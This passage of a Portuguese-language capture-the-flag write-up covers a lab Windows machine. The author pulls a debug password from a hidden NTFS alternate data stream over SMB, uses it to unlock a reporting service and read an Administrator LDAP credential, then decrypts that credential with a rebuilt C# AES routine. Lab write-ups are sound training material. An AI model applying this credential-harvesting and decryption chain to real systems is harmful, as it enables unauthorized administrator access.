Try "help" to get a list of possible commands.
smb: \> cd C.Smith
dirsmb: \C.Smith\> dir
  .                                   D        0  Sun Jan 26 02:21:44 2020
  ..                                  D        0  Sun Jan 26 02:21:44 2020
  HQK Reporting                       D        0  Thu Aug  8 19:06:17 2019
  user.txt                            A       32  Thu Aug  8 19:05:24 2019
cd 
                10485247 blocks of size 4096. 6543375 blocks available
smb: \C.Smith\> cd HQK Reporting\
cd \C.Smith\HQK\: NT_STATUS_OBJECT_NAME_NOT_FOUND
smb: \C.Smith\> cd "HQK Reporting" 
smb: \C.Smith\HQK Reporting\> dir
  .                                   D        0  Thu Aug  8 19:06:17 2019
  ..                                  D        0  Thu Aug  8 19:06:17 2019
  AD Integration Module               D        0  Fri Aug  9 08:18:42 2019
  Debug Mode Password.txt             A        0  Thu Aug  8 19:08:17 2019
  HQK_Config_Backup.xml               A      249  Thu Aug  8 19:09:05 2019

                10485247 blocks of size 4096. 6543375 blocks available
smb: \C.Smith\HQK Reporting\> allinfo " Debug Mode Password.txt"
NT_STATUS_OBJECT_NAME_NOT_FOUND getting alt name for \C.Smith\HQK Reporting\ Debug Mode Password.txt
smb: \C.Smith\HQK Reporting\> allinfo "Debug Mode Password.txt"
altname: DEBUGM~1.TXT
create_time:    Thu Aug  8 07:06:12 PM 2019 EDT
access_time:    Thu Aug  8 07:06:12 PM 2019 EDT
write_time:     Thu Aug  8 07:08:17 PM 2019 EDT
change_time:    Thu Aug  8 07:08:17 PM 2019 EDT
attributes: A (20)
stream: [::$DATA], 0 bytes
stream: [:Password:$DATA], 15 bytes
smb: \C.Smith\HQK Reporting\> 
{% endhighlight %}

Podemos ver que ele possui outro stream de dados chamado Password, vamos tentar baixa-lo:

{% highlight bash %}
smb: get "Debug Mode Password.txt":password
getting file \C.Smith\HQK Reporting\Debug Mode Password.txt:password of size 15 as Debug Mode Password.txt:password (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
{% endhighlight %}

Podemos ver o seguinte conteudo: "WBQ201953D8w"

Vamos tentar voltar ao HQK:

{% highlight bash %}
$ telnet 10.10.10.178 4386
Trying 10.10.10.178...
Connected to 10.10.10.178.
Escape character is '^]'.

HQK Reporting Service V1.2

>debug xRxRxPANCAK3SxRxRx

Invalid password entered
>debug WBQ201953D8w

Debug mode enabled. Use the HELP command to view additional commands that are now available
>session

--- Session Information ---

Session ID: 26ecec2e-c357-4860-8f29-d8045141cb6a
Debug: True
Started At: 6/2/2020 4:19:47 AM
Server Endpoint: 10.10.10.178:4386
Client Endpoint: 10.10.16.87:33366
Current Query Directory: C:\Program Files\HQK\ALL QUERIES

>setdir ..

Current directory set to HQK
>list

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

[DIR]  ALL QUERIES
[DIR]  LDAP
[DIR]  Logs
[1]   HqkSvc.exe
[2]   HqkSvc.InstallState
[3]   HQK_Config.xml

Current Directory: HQK
>cd LDAP

Unrecognised command
>setdir LDAP

Current directory set to LDAP
>list

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

[1]   HqkLdap.exe
[2]   Ldap.conf

Current Directory: LDAP
>showquery 2

Domain=nest.local
Port=389
BaseOu=OU=WBQ Users,OU=Production,DC=nest,DC=local
User=Administrator
Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=
{% endhighlight %}

Isso foi um pouco de sorte. Eu precisei navegar com setdir e list no modo debug para entender e encontrar o Ldap.conf. Mais uma vez podemos encontrar uma senha criptografada e um .exedessa vez. O qual pode ser um outro programa VB. Tentando decompilar o mesmo com https://github.com/icsharpcode/AvaloniaILSpy - Se você tiver problemas [instalando Avalonia ILSpy]({% post_url /pt_BR/2020-06-18-install-avalonia-ilspy %}).

Se você decompilalo com AvaloniaILSpy usando o .exe como entrada poderá olhar o modolu principal com o seguinte:

{% highlight vb %}
        else if (text.StartsWith("Password=", StringComparison.CurrentCultureIgnoreCase))
        {
                ldapSearchSettings.Password = CR.DS(text.Substring(text.IndexOf('=') + 1));
        }
{% endhighlight %}

Isto parece a funcão utilizada para decriptografar a senha CR.DS. Se construirmos nossa própria versão:

{% highlight vb %}
using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

public class CR
{
        private const string K = "667912";

        private const string I = "1L1SA61493DRV53Z";

        private const string SA = "1313Rf99";

        public static string DS(string EncryptedString)
        {
                if (string.IsNullOrEmpty(EncryptedString))
                {
                        return string.Empty;
                }
                return RD(EncryptedString, "667912", "1313Rf99", 3, "1L1SA61493DRV53Z", 256);
        }

        private static string RD(string cipherText, string passPhrase, string saltValue, int passwordIterations, string initVector, int keySize)
        {
                byte[] bytes = Encoding.ASCII.GetBytes(initVector);
                byte[] bytes2 = Encoding.ASCII.GetBytes(saltValue);
                byte[] array = Convert.FromBase64String(cipherText);
                Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passPhrase, bytes2, passwordIterations);
                checked
                {
                        byte[] bytes3 = rfc2898DeriveBytes.GetBytes((int)Math.Round((double)keySize / 8.0));
                        AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider();
                        aesCryptoServiceProvider.Mode = CipherMode.CBC;
                        ICryptoTransform transform = aesCryptoServiceProvider.CreateDecryptor(bytes3, bytes);
                        MemoryStream memoryStream = new MemoryStream(array);
                        CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Read);
                        byte[] array2 = new byte[array.Length + 1];
                        int count = cryptoStream.Read(array2, 0, array2.Length);
                        memoryStream.Close();
                        cryptoStream.Close();
                        return Encoding.ASCII.GetString(array2, 0, count);
                }
        }
}

public class Program
{
        public static void Main()
        {
                Console.WriteLine(CR.DS("yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4="));
        }
}
{% endhighlight %}

A saída será:  XtH4nkS4Pl4y1nGX (Utilizamos dotnetfiddle.net novamente)

Podemos conseguir acesso aos arquivos de administrador e a flag de administrator.

Espero que seja útil,
Matheus
